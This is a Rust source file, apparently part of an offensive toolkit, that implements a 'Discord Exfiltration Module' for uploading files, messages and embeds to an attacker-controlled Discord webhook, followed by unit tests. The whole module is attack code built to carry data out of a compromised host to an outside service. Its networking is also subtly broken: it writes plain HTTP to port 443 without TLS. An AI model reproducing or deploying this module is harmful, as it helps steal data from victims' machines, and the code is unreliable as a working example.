//! Discord Exfiltration Module
//!
//! Provides data exfiltration via Discord Webhooks:
//! - Send files
//! - Send messages/embeds
//! - Support for files up to 25MB (8MB for free accounts)
//! - Rich embeds for structured data
//!
//! Setup:
//! 1. Create a Discord server
//! 2. Create a webhook in a channel
//! 3. Copy the webhook URL
//! 4. Configure with TransportConfig

use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::time::Duration;

use crate::module::transport::config::TransportConfig;

/// Discord-specific errors
#[derive(Debug, Clone)]
pub enum DiscordError {
    InvalidWebhookUrl,
    NetworkError(String),
    ApiError(String),
    FileTooLarge,
    RateLimited,
}

impl std::fmt::Display for DiscordError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            DiscordError::InvalidWebhookUrl => write!(f, "Invalid webhook URL"),
            DiscordError::NetworkError(e) => write!(f, "Network error: {}", e),
            DiscordError::ApiError(e) => write!(f, "API error: {}", e),
            DiscordError::FileTooLarge => write!(f, "File too large (max 25MB)"),
            DiscordError::RateLimited => write!(f, "Rate limited by Discord"),
        }
    }
}

impl std::error::Error for DiscordError {}

/// Discord webhook client for exfiltration
pub struct DiscordClient {
    webhook_url: String,
    webhook_id: String,
    webhook_token: String,
    timeout: Duration,
}

impl DiscordClient {
    /// Create a new Discord client from webhook URL
    pub fn new(webhook_url: &str) -> Result<Self, DiscordError> {
        let (webhook_id, webhook_token) = Self::parse_webhook_url(webhook_url)?;

        Ok(Self {
            webhook_url: webhook_url.to_string(),
            webhook_id,
            webhook_token,
            timeout: Duration::from_secs(30),
        })
    }

    /// Create from transport config
    /// Config expects endpoint format: "discord://WEBHOOK_URL" or full webhook URL
    pub fn from_config(endpoint: &str) -> Result<Self, DiscordError> {
        let webhook_url = endpoint.trim_start_matches("discord://");
        Self::new(webhook_url)
    }

    /// Send a file to the webhook
    pub fn send_file(&self, file_data: &[u8], filename: &str, content: Option<&str>) -> Result<bool, DiscordError> {
        let boundary = self.generate_boundary();
        let body = self.build_multipart_form(file_data, filename, content, &boundary);

        let response = self.send_request(&body, &boundary);

        match response {
            Ok(status) => Ok((200..300).contains(&status)),
            Err(e) => Err(e),
        }
    }

    /// Send a text message to the webhook
    pub fn send_message(&self, content: &str) -> Result<bool, DiscordError> {
        // Build JSON payload
        let escaped_content = self.escape_json_string(content);
        let body = format!(r#"{{"content":"{}"}}"#, escaped_content);

        let response = self.send_request_json(body.as_bytes());

        match response {
            Ok(status) => Ok((200..300).contains(&status)),
            Err(e) => Err(e),
        }
    }

    /// Send a message with an embed
    pub fn send_embed(&self, embed: DiscordEmbed) -> Result<bool, DiscordError> {
        let embed_json = embed.to_json();
        let body = format!(r#"{{"embeds":[{}]}}"#, embed_json);

        let response = self.send_request_json(body.as_bytes());

        match response {
            Ok(status) => Ok((200..300).contains(&status)),
            Err(e) => Err(e),
        }
    }

    /// Send multiple files
    pub fn send_files(&self, files: &[(&[u8], &str)]) -> Result<bool, DiscordError> {
        let boundary = self.generate_boundary();
        let body = self.build_multipart_files(files, &boundary);

        let response = self.send_request(&body, &boundary);

        match response {
            Ok(status) => Ok((200..300).contains(&status)),
            Err(e) => Err(e),
        }
    }

    // Internal methods

    fn send_request(&self, body: &[u8], content_type: &str) -> Result<u16, DiscordError> {
        // Parse webhook URL
        let (host, port, path) = self.parse_url(&self.webhook_url)?;

        // Connect
        let addr = format!("{}:{}", host, port);
        let socket_addr = addr
            .to_socket_addrs()
            .map_err(|e| DiscordError::NetworkError(format!("DNS resolution failed: {}", e)))?
            .next()
            .ok_or_else(|| DiscordError::NetworkError("Could not resolve host".to_string()))?;

        let mut stream = TcpStream::connect_timeout(&socket_addr, self.timeout)
            .map_err(|e| DiscordError::NetworkError(format!("Connection failed: {}", e)))?;

        stream.set_read_timeout(Some(self.timeout))
            .map_err(|e| DiscordError::NetworkError(format!("Failed to set read timeout: {}", e)))?;
        stream.set_write_timeout(Some(self.timeout))
            .map_err(|e| DiscordError::NetworkError(format!("Failed to set write timeout: {}", e)))?;

        // Build HTTP request
        let mut request = format!(
            "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Type: multipart/form-data; boundary={}\r\nContent-Length: {}\r\nConnection: close\r\n",
            path, host, content_type, body.len()
        );

        request.push_str("\r\n");

        stream.write_all(request.as_bytes())
            .map_err(|e| DiscordError::NetworkError(format!("Failed to write request: {}", e)))?;
        stream.write_all(body)
            .map_err(|e| DiscordError::NetworkError(format!("Failed to write body: {}", e)))?;
        stream.flush()
            .map_err(|e| DiscordError::NetworkError(format!("Failed to flush: {}", e)))?;

        // Read response
        let mut response = Vec::new();
        stream.read_to_end(&mut response)
            .map_err(|e| DiscordError::NetworkError(format!("Failed to read response: {}", e)))?;

        // Parse status code
        self.parse_status_code(&response)
    }

    fn send_request_json(&self, body: &[u8]) -> Result<u16, DiscordError> {
        let (host, port, path) = self.parse_url(&self.webhook_url)?;

        let addr = format!("{}:{}", host, port);
        let socket_addr = addr
            .to_socket_addrs()
            .map_err(|e| DiscordError::NetworkError(format!("DNS resolution failed: {}", e)))?
            .next()
            .ok_or_else(|| DiscordError::NetworkError("Could not resolve host".to_string()))?;

        let mut stream = TcpStream::connect_timeout(&socket_addr, self.timeout)
            .map_err(|e| DiscordError::NetworkError(format!("Connection failed: {}", e)))?;

        stream.set_read_timeout(Some(self.timeout))
            .map_err(|e| DiscordError::NetworkError(format!("Failed to set read timeout: {}", e)))?;
        stream.set_write_timeout(Some(self.timeout))
            .map_err(|e| DiscordError::NetworkError(format!("Failed to set write timeout: {}", e)))?;

        let request = format!(
            "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
            path, host, body.len()
        );

        stream.write_all(request.as_bytes())
            .map_err(|e| DiscordError::NetworkError(format!("Failed to write request: {}", e)))?;
        stream.write_all(body)
            .map_err(|e| DiscordError::NetworkError(format!("Failed to write body: {}", e)))?;
        stream.flush()
            .map_err(|e| DiscordError::NetworkError(format!("Failed to flush: {}", e)))?;

        let mut response = Vec::new();
        stream.read_to_end(&mut response)
            .map_err(|e| DiscordError::NetworkError(format!("Failed to read response: {}", e)))?;

        self.parse_status_code(&response)
    }

    fn parse_url(&self, url: &str) -> Result<(String, u16, String), DiscordError> {
        let url = url.trim_start_matches("https://");
        
        let (host_port, path) = match url.split_once('/') {
            Some((host, path)) => (host, format!("/{}", path)),
            None => (url, "/".to_string()),
        };

        let (host, port) = match host_port.split_once(':') {
            Some((host, port)) => {
                let port = port.parse::<u16>().map_err(|_| {
                    DiscordError::NetworkError("Invalid port".to_string())
                })?;
                (host.to_string(), port)
            }
            None => (host_port.to_string(), 443),
        };

        Ok((host, port, path))
    }

    fn parse_status_code(&self, response: &[u8]) -> Result<u16, DiscordError> {
        let response_str = String::from_utf8_lossy(response);
        
        if let Some(status_line) = response_str.lines().next() {
            let parts: Vec<&str> = status_line.split_whitespace().collect();
            if parts.len() >= 2 {
                return parts[1].parse::<u16>()
                    .map_err(|_| DiscordError::NetworkError("Invalid status code".to_string()));
            }
        }

        Err(DiscordError::NetworkError("Could not parse response".to_string()))
    }

    fn parse_webhook_url(url: &str) -> Result<(String, String), DiscordError> {
        // Webhook URL format: https://discord.com/api/webhooks/{id}/{token}
        let url = url.trim_start_matches("https://");
        let parts: Vec<&str> = url.split('/').collect();

        // Find the webhook ID and token
        for (i, part) in parts.iter().enumerate() {
            if *part == "webhooks" && i + 2 < parts.len() {
                return Ok((parts[i + 1].to_string(), parts[i + 2].to_string()));
            }
        }

        Err(DiscordError::InvalidWebhookUrl)
    }

    fn generate_boundary(&self) -> String {
        use std::time::{SystemTime, UNIX_EPOCH};
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis();
        format!("----WebKitFormBoundary{:X}", timestamp)
    }

    fn build_multipart_form(
        &self,
        file_data: &[u8],
        filename: &str,
        content: Option<&str>,
        boundary: &str,
    ) -> Vec<u8> {
        let mut body = Vec::new();

        // Content part (if provided)
        if let Some(content) = content {
            body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
            body.extend_from_slice(b"Content-Disposition: form-data; name=\"content\"\r\n\r\n");
            body.extend_from_slice(content.as_bytes());
            body.extend_from_slice(b"\r\n");
        }

        // File part
        body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
        body.extend_from_slice(format!(
            "Content-Disposition: form-data; name=\"file\"; filename=\"{}\"\r\n",
            filename
        ).as_bytes());
        body.extend_from_slice(b"Content-Type: application/octet-stream\r\n\r\n");
        body.extend_from_slice(file_data);
        body.extend_from_slice(b"\r\n");

        // Final boundary
        body.extend_from_slice(format!("--{}--\r\n", boundary).as_bytes());

        body
    }

    fn build_multipart_files(
        &self,
        files: &[(&[u8], &str)],
        boundary: &str,
    ) -> Vec<u8> {
        let mut body = Vec::new();

        for (i, (data, filename)) in files.iter().enumerate() {
            body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
            body.extend_from_slice(format!(
                "Content-Disposition: form-data; name=\"file{}\"; filename=\"{}\"\r\n",
                i, filename
            ).as_bytes());
            body.extend_from_slice(b"Content-Type: application/octet-stream\r\n\r\n");
            body.extend_from_slice(data);
            body.extend_from_slice(b"\r\n");
        }

        body.extend_from_slice(format!("--{}--\r\n", boundary).as_bytes());

        body
    }

    fn escape_json_string(&self, s: &str) -> String {
        s.replace('\\', "\\\\")
            .replace('"', "\\\"")
            .replace('\n', "\\n")
            .replace('\r', "\\r")
            .replace('\t', "\\t")
    }
}

/// Discord embed for rich messages
#[derive(Debug, Clone)]
pub struct DiscordEmbed {
    pub title: Option<String>,
    pub description: Option<String>,
    pub url: Option<String>,
    pub color: u32,
    pub fields: Vec<DiscordEmbedField>,
    pub footer: Option<DiscordEmbedFooter>,
    pub timestamp: Option<String>,
}

impl DiscordEmbed {
    pub fn new() -> Self {
        Self {
            title: None,
            description: None,
            url: None,
            color: 0x0099FF,
            fields: Vec::new(),
            footer: None,
            timestamp: None,
        }
    }

    pub fn with_title(mut self, title: &str) -> Self {
        self.title = Some(title.to_string());
        self
    }

    pub fn with_description(mut self, description: &str) -> Self {
        self.description = Some(description.to_string());
        self
    }

    pub fn with_color(mut self, color: u32) -> Self {
        self.color = color;
        self
    }

    pub fn add_field(mut self, name: &str, value: &str, inline: bool) -> Self {
        self.fields.push(DiscordEmbedField {
            name: name.to_string(),
            value: value.to_string(),
            inline,
        });
        self
    }

    pub fn to_json(&self) -> String {
        let mut json = String::from("{");

        if let Some(ref title) = self.title {
            json.push_str(&format!(r#""title":"{}","#, self.escape_json(title)));
        }

        if let Some(ref description) = self.description {
            json.push_str(&format!(r#""description":"{}","#, self.escape_json(description)));
        }

        json.push_str(&format!(r#""color":{},"#, self.color));

        if !self.fields.is_empty() {
            json.push_str(r#""fields":["#);
            for (i, field) in self.fields.iter().enumerate() {
                if i > 0 {
                    json.push(',');
                }
                json.push_str(&format!(
                    r#"{{"name":"{}","value":"{}","inline":{}}}"#,
                    self.escape_json(&field.name),
                    self.escape_json(&field.value),
                    field.inline
                ));
            }
            json.push(']');
        }

        json.push('}');
        json
    }

    fn escape_json(&self, s: &str) -> String {
        s.replace('\\', "\\\\")
            .replace('"', "\\\"")
            .replace('\n', "\\n")
    }
}

impl Default for DiscordEmbed {
    fn default() -> Self {
        Self::new()
    }
}

/// Discord embed field
#[derive(Debug, Clone)]
pub struct DiscordEmbedField {
    pub name: String,
    pub value: String,
    pub inline: bool,
}

/// Discord embed footer
#[derive(Debug, Clone)]
pub struct DiscordEmbedFooter {
    pub text: String,
    pub icon_url: Option<String>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_discord_client_creation() {
        let url = "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz1234567890ABCDEF";
        let client = DiscordClient::new(url).unwrap();
        
        assert_eq!(client.webhook_id, "123456789012345678");
        assert_eq!(client.webhook_token, "abcdefghijklmnopqrstuvwxyz1234567890ABCDEF");
    }

    #[test]
    fn test_webhook_url_parsing() {
        let url = "https://discord.com/api/webhooks/123456789/abcdefg";
        let (id, token) = DiscordClient::parse_webhook_url(url).unwrap();
        
        assert_eq!(id, "123456789");
        assert_eq!(token, "abcdefg");
    }

    #[test]
    fn test_invalid_webhook_url() {
        let url = "https://example.com/invalid";
        let result = DiscordClient::parse_webhook_url(url);
        assert!(result.is_err());
    }

    #[test]
    fn test_escape_json_string() {
        let client = DiscordClient::new("https://discord.com/api/webhooks/123/token").unwrap();
        
        assert_eq!(client.escape_json_string("hello"), "hello");
        assert_eq!(client.escape_json_string("hello\nworld"), "hello\\nworld");
        assert_eq!(client.escape_json_string("say \"hi\""), "say \\\"hi\\\"");
    }

    #[test]
    fn test_multipart_form_building() {
        let client = DiscordClient::new("https://discord.com/api/webhooks/123/token").unwrap();
        let boundary = "test-boundary";
        
        let body = client.build_multipart_form(
            b"file content",
            "test.txt",
            Some("Message content"),
            boundary,
        );

        let body_str = String::from_utf8_lossy(&body);
        
        assert!(body_str.contains("Message content"));
        assert!(body_str.contains("test.txt"));
        assert!(body_str.contains("file content"));
    }

    #[test]
    fn test_discord_embed() {
        let embed = DiscordEmbed::new()
            .with_title("Test Title")
            .with_description("Test Description")
            .with_color(0xFF0000)
            .add_field("Field 1", "Value 1", true)
            .add_field("Field 2", "Value 2", false);

        let json = embed.to_json();
        
        assert!(json.contains(r#""title":"Test Title""#));
        assert!(json.contains(r#""description":"Test Description""#));
        assert!(json.contains(r#""color":"#));
        assert!(json.contains(r#""name":"Field 1""#));
    }

    #[test]
    fn test_url_parsing() {
        let client = DiscordClient::new("https://discord.com/api/webhooks/123/token").unwrap();
        
        let (host, port, path) = client.parse_url("https://discord.com/api/webhooks/123/token").unwrap();
        assert_eq!(host, "discord.com");
        assert_eq!(port, 443);
        assert_eq!(path, "/api/webhooks/123/token");
    }

    #[test]
    fn test_status_code_parsing() {
        let client = DiscordClient::new("https://discord.com/api/webhooks/123/token").unwrap();
        
        let response = b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n";
        let status = client.parse_status_code(response).unwrap();
        assert_eq!(status, 200);

        let response = b"HTTP/1.1 429 Too Many Requests\r\n";
        let status = client.parse_status_code(response).unwrap();
        assert_eq!(status, 429);
    }
}
